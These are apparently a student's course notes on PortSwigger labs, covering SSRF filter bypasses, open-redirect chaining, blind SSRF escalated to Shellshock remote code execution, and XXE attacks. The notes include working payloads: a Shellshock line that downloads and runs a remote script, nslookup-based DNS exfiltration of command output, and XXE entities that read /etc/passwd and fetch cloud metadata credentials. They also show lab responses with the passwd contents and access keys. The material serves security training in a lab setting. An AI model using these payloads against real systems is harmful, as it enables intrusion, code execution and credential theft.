-> we can see that it is still complaining about this, but we need to keep in mind that we introduced a new character here which is # 

q) now lets do double url encoding  of # 

eg:
stockApi=http://localhost%25%32%33@stock.weliketoshop.net

Response:
In renderer we will be able to see the "Admin Panel" 

r) This is because what we are doing right now:
We are fooling the parser into thinking that this(localhost%25%32%33) is an actual url to send the request to : 
-> And we are able to bypass the filtering, because we still have : stock.weliketoshop.net which is in the whitelist 


-> THis is because when server is receiving this  - the parser is parsing this as a url and we are exploiting the way that parser should parse  such urls 


s) In this section, we are not learning how hacking is done, but learning how compilers and parsers process data and interpret them 

t) The main take home lesson: First of all see what you have 

1)  We have url and see what has to stay 
2) We know this part(stock.weliketoshop.net) has to stay  and we cant manipulate this 
-> We have to learn every single aspect and every single corner of what you are dealing with 



66) SSRF Vulnerabilities 5 - Chaining Open Redirection with SSRF to Bypass Restrictive Filters

a) Now we know how to bypass blacklists and whitelists when it comes to ssrf vulnerability 
-> Lets have another example on a more secure website 


Target website: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection

b) In this target website also we have a shop website , where we have a stock checker 
-> As usual we should test all the functionality that you have in website 
-> We know that the stockchecker functionality's stockApi is vulnerable in this example 

stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

-> Hence we are sending the post request to repeater 

c) Now we decode the stockApi url using CTRL+SHIFT+U 

stockApi=/product/stock/check?productId=2&storeId=1

-> Now we cane see the path stockApi, which is the path on the same website 

d) Next like previous, we will edit stockapi to http://localhost/ and we get the response with following error message:

stockApi=http://localhost/

"Invalid external stock check url 'Invalid URL'"

e) So this is not working and all tricks that we used for ssrf so far, will not be working for this lab example. 

-> like checking for blacklist and then for whitelist 

f) Now coming to test other features of website, in the webpage we can see link for "Next Product" in the bottom of the page


g) if we copy this url and paste it in browser , it will take us to the next product :


https://0aab00f103e3af1c81ea70da00a700bd.web-security-academy.net/product/nextProduct?currentProductId=2&path=/product?productId=3

-> if we look in the url, we can find the path parameter which is interesting .
-> here path specifies product and productId,
-> it specifies a location on the same wwebsite 


h) Based on previous classes whenever we see this , we will test for file inclusion and open redirect vulnerabilities 

-> OPEN REDIRECT vulnerability is - we are able to put an url


https://0aab00f103e3af1c81ea70da00a700bd.web-security-academy.net/product/nextProduct?currentProductId=2&path=http://google.com

-> Now putting this, takes us to google.com 


i) What happens is  - we submitted a request to this website,: https://0aab00f103e3af1c81ea70da00a700bd.web-security-academy.net , but it got redirected to google.com 

j) We can combine this(open redirect)with knowledge of ssrf vulnerability and exploit this 

k) For that we will go to repeater and have stockApi to previous vaulue https://0aab00f103e3af1c81ea70da00a700bd.web-security-academy.net

-> Since server is rejecting whatever we send, we can change the url to below and we will change google.com to local host: 

https://0aab00f103e3af1c81ea70da00a700bd.web-security-academy.net/product/nextProduct?currentProductId=2&path=http://localhost/

UNDERLYING THEORY:
-> We are basically giving it a url , that is still in same domain - so that application does not think that something is fishy 

l) Upon sending the request, we still get the same error:

stockApi=https://0aab00f103e3af1c81ea70da00a700bd.web-security-academy.net/product/nextProduct?currentProductId=2&path=http://localhost/

"Invalid external stock check url 'Invalid URL'"

-> it means we still have problems 

m) Now lets remove the domain part in stock api url and send the request:

stockApi=/product/nextProduct?currentProductId=2&path=http://localhost/

now we get the below response:
"Missing parameter 'path'"


n) Since it is complaining about the path, lets remove currentProductId parameter as it is not needed, and make it as simple as possible



stockApi=/product/nextProduct?path=http://localhost/


o) now on removing this we and sendin the request with above stock api, we get response rendered 
-> It means that we managed to submit the request to local host and we are able to see the admin panel to which we will be able to interact with 
-> This is because server has submitted this request on behalf of us 

p) Thus all of this would have not been possible, without discovering the open redirect vulnerability

q) This is an example of chaining two vulberabilities where we chained : Open redirect vulberability with SSRF vulberability


66) SSRF Vulnerabilities 5  -  Introduction to Blind SSRF Vulnerabilities
-> In a normal ssrf vulnerability, we will forge the request as a user, you send it to a vulnerable web server and that web server is going to send that forged request  to another protected server 
-> And then send the information back to the webserver 
-> Hence the client will able to see the information 
----> Core idea: We will request something that is only available and accessible to webserver , because it is trusted 
----> All of this is possible, because web server has web application that is vulnerable to an ssrf vulnerability
-> Client communicates to server1, through web server, because client cant communicate directly , as the connections will be refused by server1

a) In blind ssrf vulnerabilities,we still have a web server that has a vulnerable web application and you are still able to send your forged request exactly the same way and the only problem is there will be no response 
-> Hence it will be difficult for the hacker to know if your attack was actually executed 

b Since in blind ssrf, no information is returned by server, blind ssrf is less dangerous 

WHAT CAN BE DONE WITH BLIND SSRF
1) in some scenarios you will be able to gain code execution or exploit vulnerabilities within devices that are connected to same network 
2) We will be able to map the internal network that this web server is connected to 
-> We can blindly send exploit payloads to devices on server1 network and hope for one of them to be vulnerable to get acces to it 
-> There is a good chance of finding exploits in the services of the devices found in server1 network , because these devices and services are not exposed to internet, therefore many cases server admins dont pay lot of attention in keeping these services fully patched and secure 

67) SSRF Vulnerabilities 5 Discovering Blind SSRF Vulnerabilities
a) In this lesson, lets see about discovering blind ssrf vulnerabilities. 
-> As mentioned earlier, main problem with blind ssrf vulnerability is that it does not send a response 

b) What we can do is - we can send a forge request to the vulnerable web server hosting the vulnerable web application to send request to my server(Myserver) that i control as the hacker 


Client--ForgedRequest-->Webserver------>Myserver
                          
						  
						  ----------Server 1
						  |
						  |
						  |
						  -----------Server2 
						  
						  
-> Then i can look at the logs of my server 
-> If i see request coming from this web server, then i will know that i managed to hijack this web server and get it to send requests to another web server that is not supposed to send requests to.

Target website: https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation


c) Lets see an example lab  of this  
-> As usual in lab, lets test every single functionality, use it as normal user and see how it works 
-> once done lets turn on interceptor , intercept vulnerbalitites and exploit them 
-> lets click on a product and intercept the request in burp suite proxy


d) In this lab, we will be playing with the referer header 


eg:
GET /product?productId=2 HTTP/2
Host: 0a1f00240358cf0686ff80f20039007a.web-security-academy.net
Cookie: session=oTQqmvcNJoVr9oWRzbLeWwzjG9eJ9vZc
Sec-Ch-Ua: "Not(A:Brand";v="24", "Chromium";v="122"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1f00240358cf0686ff80f20039007a.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i



-> All the SSRF vulberabilities we tried so far will not work to work, but they are actually working
-> They dont appear to work because, this is an example of blind ssrf vulnerabality 

e) Hence we need to modify the url location to a location of a server that we own 
-> so we can start any cloud server or node and put the address for that server in the referer url: 
-> or we can use the collaborator feature of burpsuite to get the url for my server 

######Collaborator#####
a) helps to generate a url
b) if we put that url in browser and hit
c) We will able to see all the logs of it in collaborator's "Poll Collaborator interactions" 

-> These steps are similar to a) Creating a server by yourself or in cloud b) hit the address of server in browser 
c) Monitoring the logs of that server for any http requests 


##############


f) Now in referer, lets paste the burp collaborator link 

Referer: https://sws7o9h8ee9ivisvr3hlkq0prvij7.oastify.com/ 

g) All we are doing now is: Instead of testing for local host admin or testing for internal services - we are actually putting the link for our burp collaborator url in referer: ->

-> And then if a request is sent to this url, we will able to see it in my collaborator "Poll Collaborator interactions" 


h) So we will forward this in burpsuite, with referer link as : burp collaborator link  - then we will be able to see in  "Poll Collaborator interactions" that requests are coming for this collaborator link 

i) This indicates that this web application is vulnerable to server side request forgery 
-> Because we sent it a forged request to  send another request to my web server 
-> Then i checked the logs of my webserver and noticed that this web application fulfilled my forged request and sent the request to the forged server  

j) In pen tests and in bbh programs, it is enough to simply show them that you managed to get the server to send the request to another server to display that there is a blind ssrf vulnerability

-> But in some cases, we need to show the impact, hence we need to take it another step and then try to exploit this vulnerability 


68) SSRF Vulnerabilities 5 : Exploiting Blind SSRF Vulnerabilities
-> So far we are able to send a forged request and the forged request is being fullfilled by the target web application, the request is being sent to a server(MyServer) that we control 
-> But there is nothing useful to get out of this, because we cant make this web application to send me information , eg: admin page or users to the webserver 
-> All we can do it simply get this web application(web server) to send requests to a different server(MyServer) 


Client--ForgedRequest-->Webserver------>Myserver
                          
						  
						  ----------Server 1
						  |
						  |
						  |
						  -----------Server2 
						  
						  
-> So we could use it for example to proxy or hide behind this web application or this web server 
-> But that's all we can do about it 


a) In this lesson, we will exploit blind ssrf vulnerabilities 
b) Exploitation might not be always possible in the way its showed in this lesson, but we will be seeing an example of exploiting blind ssrf vulnerabilities, just to show that it is possible to exploit them 
c) What we can do is: blindly exploit the internal services and just hope that one of them is vulnerable so that you can get 




CLIENT ---forged request-->WEB SERVER--exploit---> Internal Network and its services 

c) In the request normally: we will see a header called User-Agent. 

###User-Agent and Referer##########
1) User-Agent - It is the user agent of the browser 

The User-Agent request header is a characteristic string that lets servers and network peers identify the application, operating system, vendor, and/or version of the requesting user agent.

2) Referer:
-> The Referer HTTP request header contains the absolute or partial address from which a resource has been requested. 
-> The Referer header allows a server to identify referring pages that people are visiting from or where requested resources are being used. 
-> This data can be used for analytics, logging, optimized caching, and more.

eg: 
User-Agent: Mozilla/5.0 (Windows NT)
Accept: text/html
Referer: https://server3.com


######################

d) So In our example lab, we are sending a forged request to the web server 
-> and in this forged request we are giving the User-agent 


CLIENT--forged request---> WEB APPLICATION SERVER


1) FORGED REQUEST SENT FROM CLIENT:
GET /?product=4 HTTP/1.1
Host: webserver.com
cookie: session=c4mDUwJftlcW

User-Agent: Mozilla/5.0 (Windows NT) 
Accept: text/html
Referer: https://server3.com 

Accept-Encoding: gzip 
Connection: close 


->In this forged request, we are giving the User-Agent and we send the referer to the  target server: server3

2) WEB SERVER(WEB APPLICATION) 
-> The web application in web server is sending the request to server3, which we are specifying in the referer and it is setting the User-Agent to whatever we set in the Forged request 


eg:
GET / HTTP/1.1 
Host: server3.com
User-Agent: Mozilla/5.0(Windows NT) 

-> So if we have  deep look, at forget request and sent request from webserver on these  these two values(User-Agent/Referer), we can arrive at a conclusion: 

Forged Request:
User-Agent:EXPLOIT 
Accept: text/html
Referer: TARGET

-> Here referer is starget because the target we specify here is the destination that the webserver will be sending request to 
-> And whatever we type is User-Agnet is the exploit, which will be sent to target as User-Agent 


REQUEST FROM WEB SERVER:
Host: TARGET 
User-Agent: EXPLOIT 


3) So all we have to right now is simply : find exploits that can be targeted using the User-Agent
-> By this approach we can narrow down the exploits that we will try on the internal servers that are connected to the same web server in here. 

4) now if we search in google for : user agent server exploits , we will get: https://portswigger.net/web-security/request-smuggling/exploiting

and we will also get information about a shellshock vulnerability that happened in 2015 

-> As part of shellshock exploitation, we will by pass the webserver filtering , if we use the magic string: () { :;};


eg:
Exploit:32
() { :;}; /bin/bash -c "wget http://[redacted]/wp2 -O /tmp/w3;curl -o /tmp/w3 http://[redacted]/wp2;chmod +x /tmp/w3;sh /tmp/w3;rm -rf /tmp/w3*"

-> Whatever value we put after the magic string will get executed as code 
-> so it will get executed through the shell and hence it got the name shellshock

5) We can send this magic string() { :;};  as a value in the User-Agent and then we can chain that with whatever command we want to execute on the target 

-> if the target is vulnerable to shellshock vulnerabiltity, it will execute code on that system and therefore we will gain remote code execution on that target 

-> But still we will not be sure if this is going to be executed on the target and if we want to read the result of that command , We have no way of reading that, as it is a blind ssrf vulnerability 


6) So to see the result, we need to find a way of executing the command on the server and have it send the result to my own webserver to the hacker web server 


e) To do the same we can user nslookup command 


nslookup $(.COMMAND).myserver.com
           |
		   |
		   |
nslookup $(.COMMAND_RESULT).myserver.com


############nslookup#############
nslookup is a command that can be used to query DNS records and map the domain name to its ip address
############nslookup#############


f) In our case, we will use nslookup to perform a DNS request to a certain domain of my own: [.myserver.com]
-> and before that as a subdomain, i will substitute my command 
-> The result of substituting this command will be replaced here like this 


eg:
nslookup $(.COMMAND_RESULT).myserver.com



g) After The result of substituting this command will be replaced here like this,  then nslookup is going to perform nslookup request to a subdomain:$(.COMMAND_RESULT).myserver.com 

h) Now if i go to myserver, i will be able to read that in my logs and see the result 

i) For eg:
-> If we do something like:name + domain of my collaborator , 
---> First it will be perform uname cmd of mysystem and then it will perform nslookup for the domain 

nslookup $(uname).sddh33h3h329292h2h2.oastify.com

--> so because of this nslookup operation, my server will still receive the request as it is a subdomain of my server 


j) Now if we go to collaborator and see the poll now, we will have another DNS request and notice that the request was sent to darwin.(mycollaboratorurl).com
-> Here darwin is the uname 

k) In the next lesson, we will see how to execute this to execute code on a vulnerable server using a blind ssrf vulnerability



69) SSRF Vulnerabilities 5 : Escalating Blind SSRF to a Remote Code Execution (RCE)

a) In this lesson, we will combine everything that we learnt so far to exploit the blind ssrf vulberability that we discovered earlier and execute code on a vulnerable web server 

b) So we will do a Remote Code Execution(RCE) on the server by exploiting an SSRF vulnerabality

c) FLOW:

CLIENT --forged request--> WEBSERVER -----> TARGET SERVER---
                                                            |
															|
															|
															|
											-----------------
											|
											|
											↓ 
										MY SERVER 
										
1) 
FORGED REQUEST:

GET /?product=4 HTTP/1.1
Host: webserver.com
Cookie: session=c4mDUwRP1Z 

User-Agent: (){:;}; /user/bin/nslookup $(.whoami).myserver.com 

Accept: text/html 
Referer: https://target.com/ 

Accept-Encoding: gzip 
Connection: close  

---> In the forged request above, we are setting our target in the referer
---> We will put the exploit in the User-Agent . In the exploit: we have the magic string (){:;}; for shell shock to allow us to exploit the shellshock vulnerabality, followed by the command that we want to execute which in our case is nslookup command 
-> This command will request to : myserver 

2) This request goes to a vulnerable web application which has blind ssrf vulnerability
-> As a result, WEB application(web server) is going to send this to target.com , because we have set the host as target.com 

-> Here the user agent is set with the same exploit: (){:;}; nslookup $(.whoami).myserver.com 
-> As a result of this: on target.com the following command will be executed: (){:;}; nslookup $(.whoami).myserver.com 
-> consider we get root as answer fro whomai, then nslookup will be performed on root.myserver.com 

REQUEST TO TARGET:

GET / HTTP/1.1
Host: target.com
User-Agent: (){:;}; nslookup $(.whoami).myserver.com 



3) Because of the nslookup command the value; root.myserver.com will be sent to myserver 
4) Then i will read the logs of myserver and note the result of execution of my command 

d) To see the same in practice in our lab, lets turn on the interceptor click on any product, send the request to repeater 

e) In repeater request:
1)  we will set the target which is referer to a server that is running locally: 
-> We have previously set the private address in order to access local services that are connected to the same web server 


eg:
Referer: http://192.168.1:8080/

2) In User-Agent, we will set our exploit as the shellshock magic string and the command we are trying to execute:

User-Agent: (){ :; }; /user/bin/nslookup $(whoami).d3ewiuwieuueue.oastify.com 

f) So here we have basically set our target in the referer and exploit in the User-Agent 

g) After setting these in the Repeater request, if we send it  and look into the collaborator for any incoming requests by polling it , WE GOT NOTHING 

-> We got nothing because the target that we specified in here: 192.168.0.1 is probably not vulnerable 

h) Therefore we need to something that we covered earlier.

i) We need to use the intruder to try this exploit on every possible IP that is connected to the same network as the web server 
-> Because there is a good chance of discovering vulnerabilities in the services because they are internal services of an internal network to which server admin wont pay much attention to them thinking that these can never be exploited 

j) Now we will send repeater reques to intruder and there we will clear $ sign and increase value of referer IPs from 1 to 254 
-> In payloads set type as numbers and set range from 1 to 254 


Referer: http://192.168.0.$1$:8080/ 

k) By this we will send request to every possible ip of last octet from 1 to 254 

l) Now if we check in burp collaborator, we can see additional dns requests and it shows the nslookup command beng executed successfully 


m) Basically from now on, we can replace "whoami" with any command that you want to execute on the server 

-> it is not only going to execute that on the target server, but also going to send the results of execution to your own web server 

n) Thus we accomplished Remote Code execution[RCE} on a target server through a blind srf vulnerability 

 

70) XXE Injection Vulnerabilities 6 - Introduction
a) XXE - XML External Entity injection 
b) According to OWASP top 10, this is the 5th most common security within the tested websites 
-> 90% of the websites are vulnerable to this vulnerability 
c) THis vulnerability is moved from no:6 to no:5 as more and more websites are being discovered with these vulnerabilities
-> Hence chances of this vulnerabality going up in the list of owasp top 10 is higher 
-> github and twitter were vulnerable to this vulnerability before, with twitter paying $10000 to the hunter that discovered it 


71) XXE Injection Vulnerabilities 6 - What is XML 
a) WHile HTML is used to display elements on the screen,, XML is designed to store and transport data 
-> it is not used to display /compute or calculate anything 
-> It is simply designed to transport data and store data in a predefined and organized manner 
b) Since XML is markup language, it does not do anything 
c) In these lessson on XXE, we will looking into type of vulnerabilities that happen when xml is used 

71) XXE Injection Vulnerabilities 6 - Exploiting a basic XXE injection 
a) In this lesson we will see how xml works and how to discovery and exploit XXEs 

Targetwebsite: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

b) In the target lab, we will be able to view product details and "checkstock" 

c) Also if we check the url we will be able to see productid is equal to a number 

eg:
https://0ab8003b046fbb888166572f009500be.web-security-academy.net/product?productId=2

d) We can test this website for all of the vulnerabilities eariler 

e) Now we will try to discover and XXE here 
f) To do that turn on interceptor in BurpSuite -> Proxy 
-> We will use feature checkstock 

g) Once we click on "checkstock" we can see a post request  being sent to this path: /product/stock
1) Also we can look there Content-Type is : application/xml , which tells that this web application is using xml 
2) Also in body we can see xml :

<?xml version="1.0" encoding="UTF-8"?>
																								<stockCheck>
																									<productId>2</productId>
																									<storeId>1</storeId>
																								</stockCheck>


3) When we click on checkstock, website is going to send data to webapplication, via XML 
4) As we have learnt in the previous examples, whenever we see data being sent to webserver or to the webapplication - -> we should start 	INTERFERING  with the data , 
-> see if we can manipulate it in a way that will cause the web application or the end server side to do something  good for us or to reveal something or give you access and so on 
-> We can manipulate directly in xml and forward the request 


eg:
POST /product/stock HTTP/2
Host: 0ab8003b046fbb888166572f009500be.web-security-academy.net
Cookie: session=H45jcwlbCh6mHfeJNVNx8bgEop4wvutn
Content-Length: 107
Sec-Ch-Ua: "Not(A:Brand";v="24", "Chromium";v="122"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: https://0ab8003b046fbb888166572f009500be.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ab8003b046fbb888166572f009500be.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?>
																								<stockCheck>
																									<productId>2</productId>
																									<storeId>1</storeId>
																								</stockCheck>


h) So next step is to start manipulating and see how it is going to work 
i) Since this web application is using XML, we can create an external entity 
-> We are going to use a feature of XML to see if we can manipulate this XML to see if it can give us useful data. 

j) We are going to paste this external entity 
1)  This line below is basically a definition for an external entity in XML 


Exploit:33
<!DOCTYPE test [
																									<!ENTITY xxe SYSTEM "file:///etc/passwd">
																								]>

2) We are defning an XML entity , defining a DOCTYPE calling it as test,  and then we are creating an external entity with name xxe(this can be called by any name) 

!DOCTYPE test [ <!ENTITY xxe

3) The most important part here is the use of the SYSTEM, which basically can be used to read files on the system or  even fetch URLs 

SYSTEM

4) So what we are saying is: We want to read a file on the local system and the location of this file is /etc/password 

SYSTEM "file:///etc/passwd">

5) This file can be any file you want, if you manage to read a local file on the target computer regardless of what file it is - this will be considered a vulnerability

eg Request:

POST /product/stock HTTP/2
Host: 0ab8003b046fbb888166572f009500be.web-security-academy.net
Cookie: session=H45jcwlbCh6mHfeJNVNx8bgEop4wvutn
Content-Length: 107
Sec-Ch-Ua: "Not(A:Brand";v="24", "Chromium";v="122"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: https://0ab8003b046fbb888166572f009500be.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ab8003b046fbb888166572f009500be.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?>
																								<stockCheck>
																									<productId>2</productId>
																									<storeId>1</storeId>
																								</stockCheck>


6) The above line is a payload which we can use to exploit XXE vulnerabilities 

k) Cheatsheet of xxe vulnerabilities:

https://cheatsheet.haax.fr/web-pentest/files-and-files-inclusions/xxe/

l) Using this payload in XML request:we got response "Invalid Product ID:" in the response 

eg Response:
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 24

"Invalid product ID: 2'"

-> The reason for this is, we created this DOCTYPE and we created this external entity test and Entity xxe
---> What this will do is: It will load whatever content in this file /etc/password and the value of this will be stored in the variable: xxe  
-> But we have not read this variable 

m) One more thing to note is: 

In the error response we get it as output, whatever put it after the number 2, 

eg: in request: 

<?xml version="1.0" encoding="UTF-8"?>
																								<!DOCTYPE test [
																									<!ENTITY xxe SYSTEM "file:///etc/passwd">
																								]>
																								<stockCheck>
																									<productId>2'</productId>
																									<storeId>1</storeId>
																								</stockCheck>


Eg:
Response:

"Invalid product ID: 2'"


-> So if we put xxe after this 2, we will get it printed here 


n) In Xml if we want to refer variable, you type & followed by variable name and a semi colon   &xxe;


eg:Request

Exploit:33_2

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
	<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>




eg Response:


HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2338

"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
"


O)  So what happened here is: file contents of /etc/passwd is read and stored in variable xxe and then displayed in response using &xxe; 


p) once you discover this and read all the contents, we can submit it as a bug 
-> THis vulnerability helps us to read sensitive files and you can further exploit this to do so much more on the target web server 


71) XXE Injection Vulnerabilities 6 - Discovering an SSRF through a blind XXE injection 
a) In this lesson we will see an example of using an xxe to cause the target server to send a request 


HACKER ---xxe---> VULNERABLE WEBSITE ----ssrf--->SERVER WITH SENSITIVE DATA 


Targetwebsite: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf


b) Target lab and its associated activity:
-> Lab has a"checkstock" feature that parses xml input and returns any unexpected values in the response 
-> The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is  http://169.254.169.254/ . 
-> This endpoint can be used to retrieve data about the instance, some of which might be sensitive 


-> To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint 

c) These vulnerabilities can be used to get useful data and  we can communicate with this particular server through an XXE vulnerabality

-> so if you simply copy this IP: http://169.254.169.254/, and load it in your browser , this will not work - because the server that is running on this IP is configured to only work if a specific server communicates with it . 




Vulnerable website ------YES--------->Server with Sensitive data(169.254.169.254) 

Hacker ------------------No----------->Server with Sensitive Data(169.254.169.254) 


-> It refuses connections that it gets from all of the servers around the world and it only accepts connections from web applications that is designed to use it 


d) Hence we need to use an XXE to cause the target server that we are manipulating to communicate with it 

e) In target lab, we have website similar to the one we used previously and we will be using checkstock functionality here 

-> We can see xml in request and we can send the request to repeater 

f) To manipulate the payload, we will use the exact exploit which we used earlier:

<!DOCTYPE test [
	<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
				   
				   
1)  Only difference is that, instead of giving a local file here, we will specify an ip, which is the ip of the server which we want to communicate with :

Exploit:33_3
<!DOCTYPE test [
	<!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>

2) Right now we are seeing another usage of this specific payload in XXE vulnerabilities

-> instead of reading a file on the local server, we will use the local server that is running the web application to communicate with another server that is at this location https://169.254.169.254  

3) So instead of putting a file pattern here, we are putting a location for another server 
4) We are assuming through information gathering stage or may be through other exploitation , that this server can lead to sensitive information 

g) So lets inject the exploit in the xml and in product id we will refer to the variable : &xxe;


eg: request 


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
	<!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>

Response:
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 28

"Invalid product ID: latest"

h) We get "Invalid product ID: latest" in the response
-> So it is directing us  to another path on the target server 
-> Other path is :   /latest 

-> so we will change exploit like this:

eg:


<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest">



response:

HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 31

"Invalid product ID: meta-data"


i) Now it gives us another path : meta-data , we will put that also in exploit now 


eg:
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data">
]><stockCheck>


response:
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 25

"Invalid product ID: iam"

j) Append iam to exploit 

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam">
]><stockCheck>

response:

"Invalid product ID: security-credentials"

k) append security-credentials to the exploit 

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials">
]><stockCheck>


response:
"Invalid product ID: admin"

l) Next add admin 

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">


Response:
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 552

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2024-03-10T09:51:38.945284118Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "DkRPnVE8SCMo5dfmOVKX",
  "SecretAccessKey" : "d4AnJbxAGGUeUwWVoTKXeAIM6sOqD5N8qiRy5hQo",
  "Token" : "6gP64EjiMDq3oXuvVrySVEdnebJv5y4lsmVAV70aa6dRexnFW2YQ4DYmFyXHP6CB1HeoyPDKhzQfib6nqFZnhjKbLGCy9ZniWVMPimJ1ZiHMiwYM8anzXwW87w569AVFKTC2qVM1t1h1xMHPOWfhnF8Aa7Bu3tYU7OI3OGw3JtBni4hWWwgFY1681HXPca1pLSkF4m8J6eFwam7JNaL7x3mz1bcou5DPjNJpgMSzd73kUIDZGLZkeNEh9T2JVmJD",
  "Expiration" : "2030-03-09T09:51:38.945284118Z"
}"


m) Finally we managed to get the security credentials, the access key id, token and expiration 

n) In this example, we used the exact same payload 
-> Only difference is, instead of specifying a file path , we specify a remote server to communicate with and use that to gather or extract information from that server 

